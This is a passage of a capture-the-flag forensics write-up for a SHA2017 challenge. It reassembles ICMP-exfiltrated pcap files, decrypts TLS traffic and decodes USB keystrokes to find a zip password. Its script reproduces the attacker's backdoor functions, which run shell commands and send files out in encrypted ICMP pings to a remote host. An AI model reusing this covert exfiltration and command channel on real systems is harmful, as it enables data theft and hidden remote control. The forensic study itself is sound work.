class="line">getfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRU</div><div class="line">getfile:3:8XB7Q94TDBClV8w4qhq69z3FZYrv8t2WgEKqgXrWdlHdlAFX8ALVsMhCJIBkRaym0tYdVp1SG4MaZR4Tss3uWqkUHUP2IHv2mxW9kJtXQcCFacZu6BB6WbVWAABCAAAAQgAAAAAMKUT6VQAMKT39sAgARQAANPb5QABABsB2wKgBAsCoAQEBu8YiHIz10SeSnX2AEADzDMEAAAEBCAoAJQRCAWpAmegQelnOVgAAjQAAAI0AAAAADCk9_bAADClE-lUIAEUAAH_bZ0AAQAbbvcCoAQHAqAECxiIBuyeSnX0cjPXRgBgA8YPFAAABAQgKAWpAowAlBEIUAwMAAQEWAwMAQGxEpdaDTXP8knA4zCtiwo73wxpiSMwEg4mUp0JHTM5EVi8fDHmJwxa4h0XRCtUMYW1ku3J8B2mDM4-Be7yzVgXoEHpZwVcAAEIAAABCAAAAAAwpRPpVAAwpPf2wCABFAAA09vpAAEAGwHXAqAECwKgBAQG7xiIcjPXRJ5KdyIAQAPMMbAAAAQEICgAlBEIBakCj6BB6WWhYAABcAQAAXAEAAAAMKUT6VQAMKT39sAgARQABTvb7QABABr9awKgBAsCoAQEBu8YiHIz10SeSnciAGADzZFwAAAEBCAoAJQRCAWpAoxYDAwDKBAAAxgAAASwAwAgdhAXn_d9KSZnZsG-gE9lS8acf1BQiUuNF04t4gevS8ICJtSUIJdGsE-qc2tSvQnLimi0T1iSzd47KHZC4nPZt8UmAPz8CvuPkoG2nSNnhtH7aG3vuLtigzX4okzcPOGpR</div><div class="line">getfile:15:TcpH8DKbQqyDTZP90vOPC7ZroVI7FBLP3tehUVdCsB5kcVOtOgwoeNuBDLMQwHANdbwLTIcc8rWzDtchd96wrcnYimMMVXom7hJFk9CYIvLi1AjgVnUmgijI_ZAvr768ZkMUK9zVD1CWi7x1yw-7a3r9XPaQAx4C_VXxF42RQ7lofpm0NeTW_RQddZVBmc7JRGHSyhhgvnPK9AvSftJCCR2w4U7ivYo3uXfyVBjkj2OnMPWtUeqWQxEMSVPnTp8pQ7CHG0ZhHzowGnNued80Q9s3cR5Dkb2EeAVtwoWObjMziRAuwahOsO88dbD0mOFbJMPNCQst5qOv0KkgXc4ArGuRdj3DqLdqZboIsRIFwk1BKxHoaBedqa8F8GR2t1RZ-xR31I5RSnJrJSn-v2ktPLitzNW5K46Ors604DI6pwH3GKv1moTI-Bc_S54n1WATXNYWBcE5T8_BxHPB6ezfXuuJK-Epgfu5UDMwkRCS84b0R5GT4gYdWLqOvIF0bJrLI1OgDT-ODRNIt_Ehq3jnXlV0gIwLr0nWLzGjDh4dhGdvNC1kylYtkzta6L-eBcnkDjKhyWMZa2pL6NN5iF2RaoKswfm_ZmBEygpY0s8VlBFf0Ut7s6D1vyUNiNEGwR8LZ13L4rxE4Cz51rFPeKFO80yWeYtXEyCz7idxVoT9cp_U8ospLrMcmalnXvZL4OGPzwT7G_dpZoZ6tMYRBKwgSn1KuyvmGlY9VGyQk16PqgpAk09-tmwlYJeEhPQGlrx-JpW6agdmeibUwsMZ0-oYJBhD0cvVwyOt</div><div class="line">getfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1</div><div class="line">getfile:165:cHurdwdnjePy6Xa5SBJU_Mbe1VPdwEuXvCW1XXCaId6Y09yNKbwX0W3KPWiTJ_ZgDoSKci1FZs9sK9gFobVoTOMBicG6atQrQ5TuoL-Er2T8HDGkhComD0AfHzgxHQRy5LbcUsRpMvLLJfsv0ULnwmfjcmk6RWT1IChIG7gUxie3xVnh9lFiOZlVFxFz_NB1JPlWpTqV-8c_tFM9tSk4ud7u4lMdjPgKPO-5eknyZiT8g5WbwDqteDdSuRAfYTl0A0EoEBqNr3wiRTxJJlhGVCWX70ki5CDNCNKMlK9YifFey6W2DMv4_5m616CWgLUNJTeowqqHWA2INCeLrn-dHZi-ADsKHNYoxEqIrJlpZCiUM5L-rOC_TtQ6COT7Aro7kaH1qdQkwgygg2qP6_Xe5mFO4IOMFkcx-51kDyjtfHUGBx2veXXEDfAScnKY9GY_905jJafZ9J8vRfeszHiD0quOv0edGw8NbKp3_pk2nL2Ey-vCIcm4lR0WXOFuOmwj67o6mk_cq2n7axOkJ8gcEc61AqJ7LzZbJFr0_b3bnaZzkXuKF_IokNRQJDpD1WfLkI_ba8Q3u2d8nui9ljBWs7VzwAl8dR1iH4QtIIturGVQEIR8jA3mn1evUTQvFjA-BN2nlOmXqyjoXU0HcaOC53Vj2d1r_J_64CmdAnlWJ-2aeG3dCoP0fYYxvKKpI1g6WXCX_Li701DtBTl6Hnp6ICHW7GEqxK96H0BfB_Sb6UQFa_9ScfbNd3ohC9xxYiiGSssqHiHkiAJ0vfYXSZYMs9YeTpSA273k</div><div class="line">...Truncated...</div></pre></td></tr></table></figure>
<p>We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see “getfile:/tmp/intranet.pcap” so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it’s actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!).<br>Our final python script will be:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">BS = <span class="number">16</span></div><div class="line">pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line">key2=<span class="string">"K8djhaIU8H2d1jNb"</span></div><div class="line">stri=<span class="string">"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ=="</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">( self, raw )</span>:</span></div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().read( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:<span class="number">16</span>]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(cmd)</span>:</span></div><div class="line">    ps = subprocess.Popen(cmd,shell=<span class="keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_ping</span><span class="params">(host, magic, data)</span>:</span></div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(L, n)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(L), n):</div><div class="line">        <span class="keyword">yield</span> L[i:i+n]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(host, magic, fn)</span>:</span></div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).read())</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, <span class="number">500</span>):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = <span class="keyword">True</span></div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># cipher = AESCipher(sys.argv[1])</span></div><div class="line"></div><div class="line"><span class="comment"># while True:</span></div><div class="line"><span class="comment">#     try: </span></div><div class="line"><span class="comment">#         pkts = sniff(filter="icmp", timeout =5,count=1)</span></div><div class="line"></div><div class="line"><span class="comment">#         for packet in pkts:</span></div><div class="line"><span class="comment">#              if  str(packet.getlayer(ICMP).type) == "8": </span></div><div class="line"><span class="comment">#                 input = packet[IP].load</span></div><div class="line"><span class="comment">#                 if input[0:len(magic)] == magic:</span></div><div class="line"><span class="comment">#                     input = input.split(":")</span></div><div class="line"><span class="comment">#                     data = cipher.decrypt(input[1]).split(":")</span></div><div class="line"><span class="comment">#                     ip = packet[IP].src</span></div><div class="line"><span class="comment">#                     if data[0] == "command":</span></div><div class="line"><span class="comment">#                         output = run_command(data[1])</span></div><div class="line"><span class="comment">#                         send_ping(ip, magic, "command:&#123;&#125;".format(output))</span></div><div class="line"><span class="comment">#                     if data[0] == "getfile":</span></div><div class="line"><span class="comment">#                         #print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line"><span class="comment">#                         get_file(ip, magic, data[1])</span></div><div class="line"><span class="comment">#     except:</span></div><div class="line"><span class="comment">#         pass</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#   break</span></div><div class="line"><span class="comment"># print(final)</span></div><div class="line"></div><div class="line"><span class="comment">#for i in range(0,301):</span></div><div class="line"><span class="comment">#   print(i, dicio[str(i)])</span></div><div class="line"><span class="comment"># for k,v in dicio.iteritems():</span></div><div class="line">    <span class="comment"># print(k, base64.urlsafe_b64decode(v))</span></div><div class="line"></div><div class="line"><span class="comment"># print(base64.urlsafe_b64decode(final))</span></div><div class="line"></div><div class="line">    <span class="comment"># if outp not in lis:</span></div><div class="line">    <span class="comment">#     # print(outp)</span></div><div class="line">        </div><div class="line">    <span class="comment">#     print(numb)</span></div><div class="line">    <span class="comment">#     lis.append(outp)</span></div><div class="line">        </div><div class="line">  <span class="comment"># lis = sorted(lis)</span></div><div class="line">  <span class="comment"># for it in lis:</span></div><div class="line">    <span class="comment"># print(it)</span></div><div class="line"></div><div class="line"></div><div class="line">dicio = &#123;&#125;</div><div class="line">lis = []</div><div class="line">n = AESCipher(key2)</div><div class="line">infile1=<span class="string">"encrypted1"</span></div><div class="line"><span class="keyword">with</span> open(infile1) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(strin),<span class="number">2</span>):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line"></div><div class="line">infile2=<span class="string">"encrypted2"</span></div><div class="line"><span class="keyword">with</span> open(infile2) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> lin <span class="keyword">in</span> strin:</div><div class="line">    outp = n.decrypt(lin)</div><div class="line">    numb = re.findall(<span class="string">r"getfile:([0-9]+).*"</span>, outp)</div><div class="line">    outp = re.findall(<span class="string">r"getfile:[0-9]+:(.*)"</span>, outp)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> numb != []:</div><div class="line">      <span class="keyword">if</span> dicio.has_key(numb[<span class="number">0</span>]):</div><div class="line">        dicio[numb[<span class="number">0</span>]].append(outp[<span class="number">0</span>])</div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        dicio[numb[<span class="number">0</span>]]=[outp[<span class="number">0</span>]]</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">    final=<span class="string">""</span>    </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">301</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            final += base64.urlsafe_b64decode(dicio[str(i)][j])</div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    file = open(<span class="string">'lol%d.pcap'</span>%j,<span class="string">'wb+'</span>)</div><div class="line">    file.write(final)</div></pre></td></tr></table></figure>
<p>Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:<br>Edit -&gt; Preferences -&gt; protocols -&gt; SSL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol1.pcap intranet.pcap</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark intranet.pcap</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/v2aJGf3.png" title="Decrypt TLS"></p>
<p>Now seeing HTTP packages we can see that the hacker downloaded file secret.zip!<br><img src="https://i.imgur.com/DhQKSaT.png" title="Export ZIP"></p>
<p>The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was “somehow” complicated) or we needed to find it in our USB capture! which is a USB keyboard capture!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol4.pcap usb.pcap</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark usb.pcap</div></pre></td></tr></table></figure>
<p>Extract the keys pressed from the usb.cap:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r usb.pcap -Y <span class="string">"frame.len==72"</span> -Tfields -e usb.capdata &gt; usb.txt</div></pre></td></tr></table></figure>
<p>And now getting the table to decode the keys from <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a><br><img src="https://i.imgur.com/u6IBaE4.png" title="keyboard table"></p>
<p>Writting the script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">shift = <span class="string">"02:00:00:00:00:00:00:00"</span></div><div class="line">ignore = <span class="string">"00:00:00:00:00:00:00:00"</span></div><div class="line">ignore2 = <span class="string">"01:00:00:00:00:00:00:00"</span></div><div class="line">keys_dict = &#123;<span class="string">'04'</span>: <span class="string">'a'</span>,</div><div class="line">       <span class="string">'05'</span>: <span class="string">'b'</span>,</div><div class="line">       <span class="string">'06'</span>: <span class="string">'c'</span>,</div><div class="line">       <span class="string">'07'</span>: <span class="string">'d'</span>,</div><div class="line">       <span class="string">'08'</span>: <span class="string">'e'</span>,</div><div class="line">       <span class="string">'09'</span>: <span class="string">'f'</span>,</div><div class="line">       <span class="string">'0a'</span>: <span class="string">'g'</span>,</div><div class="line">       <span class="string">'0b'</span>: <span class="string">'h'</span>,</div><div class="line">       <span class="string">'0c'</span>: <span class="string">'i'</span>,</div><div class="line">       <span class="string">'0d'</span>: <span class="string">'j'</span>,</div><div class="line">       <span class="string">'0e'</span>: <span class="string">'k'</span>,</div><div class="line">       <span class="string">'0f'</span>: <span class="string">'l'</span>,</div><div class="line">       <span class="string">'10'</span>: <span class="string">'m'</span>,</div><div class="line">       <span class="string">'11'</span>: <span class="string">'n'</span>,</div><div class="line">       <span class="string">'12'</span>: <span class="string">'o'</span>,</div><div class="line">       <span class="string">'13'</span>: <span class="string">'p'</span>,</div><div class="line">       <span class="string">'14'</span>: <span class="string">'q'</span>,</div><div class="line">       <span class="string">'15'</span>: <span class="string">'r'</span>,</div><div class="line">       <span class="string">'16'</span>: <span class="string">'s'</span>,</div><div class="line">       <span class="string">'17'</span>: <span class="string">'t'</span>,</div><div class="line">       <span class="string">'18'</span>: <span class="string">'u'</span>,</div><div class="line">       <span class="string">'19'</span>: <span class="string">'v'</span>,</div><div class="line">       <span class="string">'1a'</span>: <span class="string">'w'</span>,</div><div class="line">       <span class="string">'1b'</span>: <span class="string">'x'</span>,</div><div class="line">       <span class="string">'1c'</span>: <span class="string">'y'</span>,</div><div class="line">       <span class="string">'1d'</span>: <span class="string">'z'</span>,</div><div class="line">       <span class="string">'1e'</span>: <span class="string">'1'</span>,</div><div class="line">       <span class="string">'1f'</span>: <span class="string">'2'</span>,</div><div class="line">       <span class="string">'20'</span>: <span class="string">'3'</span>,</div><div class="line">       <span class="string">'21'</span>: <span class="string">'4'</span>,</div><div class="line">       <span class="string">'22'</span>: <span class="string">'5'</span>,</div><div class="line">       <span class="string">'23'</span>: <span class="string">'6'</span>,</div><div class="line">       <span class="string">'24'</span>: <span class="string">'7'</span>,</div><div class="line">       <span class="string">'25'</span>: <span class="string">'8'</span>,</div><div class="line">       <span class="string">'26'</span>: <span class="string">'9'</span>,</div><div class="line">       <span class="string">'27'</span>: <span class="string">'0'</span>,</div><div class="line">       <span class="string">'28'</span>: <span class="string">'\r\n'</span>,</div><div class="line">       <span class="string">'29'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2a'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2b'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2c'</span>: <span class="string">' '</span>,</div><div class="line">       <span class="string">'2d'</span>: <span class="string">'-'</span>,</div><div class="line">       <span class="string">'2e'</span>: <span class="string">'='</span>,</div><div class="line">       <span class="string">'2f'</span>: <span class="string">'['</span>,</div><div class="line">       <span class="string">'30'</span>: <span class="string">']'</span>,</div><div class="line">       <span class="string">'31'</span>: <span class="string">'\\'</span>,</div><div class="line">       <span class="string">'32'</span>: <span class="string">'#'</span>,</div><div class="line">       <span class="string">'33'</span>: <span class="string">':'</span>,</div><div class="line">       <span class="string">'34'</span>: <span class="string">"'"</span>,</div><div class="line">       <span class="string">'35'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'36'</span>: <span class="string">','</span>,</div><div class="line">       <span class="string">'37'</span>: <span class="string">'.'</span>,</div><div class="line">       <span class="string">'38'</span>: <span class="string">'/'</span>&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'usb.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">  keys_lines = f.readlines()</div><div class="line">  s = <span class="string">""</span></div><div class="line">  <span class="keyword">for</span> key <span class="keyword">in</span> keys_lines:</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> key.strip() == shift <span class="keyword">or</span> key.strip() == ignore <span class="keyword">or</span> key.strip() == ignore2:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">    k=key.split(<span class="string">":"</span>)</div><div class="line">    <span class="comment">#print key == ignore, key == '02:00:00:00:00:00:00:00', key</span></div><div class="line">    <span class="keyword">if</span> k[<span class="number">0</span>] == <span class="string">'02'</span>: <span class="comment">#shift pressed </span></div><div class="line">      <span class="keyword">if</span> keys_dict[k[<span class="number">2</span>]] == <span class="string">'2'</span>:</div><div class="line">        s  += <span class="string">'@'</span></div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        s += keys_dict[k[<span class="number">2</span>]].upper()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      s += keys_dict[k[<span class="number">2</span>]]</div><div class="line">  <span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python usb.py</div><div class="line">root</div><div class="line">Welcome123</div><div class="line">ls -la</div><div class="line">curl -ks https://root:Welcome123@intranet/secret.zip</div><div class="line">unzip secret.zip</div><div class="line">Pyj4m4P4rtY@2017</div><div class="line">cat secret.txt</div><div class="line">display hamburg</div><div class="line">logoout</div></pre></td></tr></table></figure>
<p>The password is Pyj4m4P4rtY@2017 for the zip file!</p>
